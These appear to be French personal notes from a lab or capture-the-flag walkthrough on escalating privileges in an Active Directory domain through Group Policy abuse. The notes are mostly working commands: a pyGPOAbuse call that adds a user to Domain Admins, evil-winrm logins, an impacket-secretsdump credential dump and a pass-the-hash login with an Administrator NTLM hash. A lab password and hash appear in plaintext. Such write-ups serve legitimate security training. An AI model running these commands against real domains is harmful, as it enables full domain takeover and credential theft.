Source :
https://www.hackingarticles.in/gpo-abuse-exploiting-vulnerable-group-policy-objects/

On va télécharge pyGPOAbuse :
```
git clone https://github.com/hackndo/pyGPOAbuse.git
```

puis :
```
cd pyGPOAbuse

python3 -m virtualenv .venv

source .venv/bin/activate

python3 -m pip install -r requirements.txt
```

ON doit récupérer le GUID dans bloodhound:


en sélectionnant DDP, on obtient : 
```
Gpcpath:

\\SECURA.YZX\SYSVOL\SECURA.YZX\POLICIES\{31B2F340-016D-11D2-945F-00C04FB984F9}
```

On va pouvoir ajouter charlotte au domain admin :
```
python3 pygpoabuse.py 'secura.yzx/charlotte:Game2On4.!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -taskname "Webdev disable" -dc-ip 192.168.238.97 -powershell -command "net group 'Domain Admins' charlotte /add"
```


On se connecte avec evil-winrm :
```
$ evil-winrm -u charlotte -p 'Game2On4.!' -i 192.168.238.97 
```


On attend un peu et on voit qu'on est maintenant domain admin :

```
net user charlotte /domain
```

Donc on appartient maintenant au 'domain admins'

# Directory credentials :
On enregistre dans le fichier /etc/hosts de kali le dc01 :


```bash
impacket-secretsdump "secura.yzx/charlotte":'Game2On4.!'@"dc01.secura.yzx"

```

On obtient le hash de :
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d38e7c66048f80fd9566ab85afca76b1:::

On se connecte au DC avec le hash :
```
$ evil-winrm -u Administrator -H 'd38e7c66048f80fd9566ab85afca76b1' -i 192.168.238.97 
```
